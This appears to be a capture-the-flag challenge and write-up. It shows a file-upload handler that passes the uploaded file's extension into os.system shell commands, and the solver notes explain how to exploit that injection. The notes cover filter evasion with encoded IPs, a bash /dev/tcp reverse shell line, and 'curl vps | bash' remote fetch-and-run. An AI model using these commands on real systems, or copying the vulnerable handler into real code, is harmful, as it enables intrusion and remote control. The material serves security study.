# Challenge 
```php 
if file_src == "vpn_logo_upload":
    data = request.files.vpn_logo
    filename = data.filename
    if data.file:
        file_ext = os.path.splitext(filename)[1]
        output_path = "/usr/vtm/var/www/html/vpn/upload/" + "vpn_logo" + file_ext
        bak_tag = False
        bak_file_path = output_path + ".bak"
        if os.path.exists(output_path):
            cmd = "mv -f " + output_path + " " + bak_file_path
            os.system(cmd)
            bak_tag = True
        write_file(filename, data.file, output_path)
        file_size = os.path.getsize(output_path)
        file_type = mimetypes.guess_type(output_path)
        del_cmd = "rm -f " + output_path
        if file_type[0] != "image/jpeg" and file_type[0] != "image/png" and file_type[0] != "image/gif":
            result = {"return": -2, "reason": file_type[0]}
            os.system(del_cmd)
        elif file_size < file_size_1M:
            result["data"]["new_name"] = "vpn_logo" + file_ext
        else:
            result = {"return": -2, "reason": "file is too large"}
            os.system(del_cmd)
            if bak_tag:
                bak_cmd = "mv -f " + bak_file_path + " " + output_path
                os.system(bak_cmd)
```


# Refference 
+ [l3m0n:小密圈专题(2)-命令执行绕过](http://www.cnblogs.com/iamstudy/articles/command_exec_tips_1.html)



# By JrXnm

在后缀名可以命令执行, 因为有os.path.splitext()划分后缀,所以命令中不能含有`/ . \` 

不过可以用远程下载执行,curl 和wget都行.

将IP转成16进制ip(先将点分十进制各个转换成16进制,再合在一起转换成8进制,访问时加0这个前缀.)

在vps上挂好shell,比如  `bash -i >& /dev/tcp/127.0.0.1/6666 0>&1` 然后 curl下载

curl  vps | bash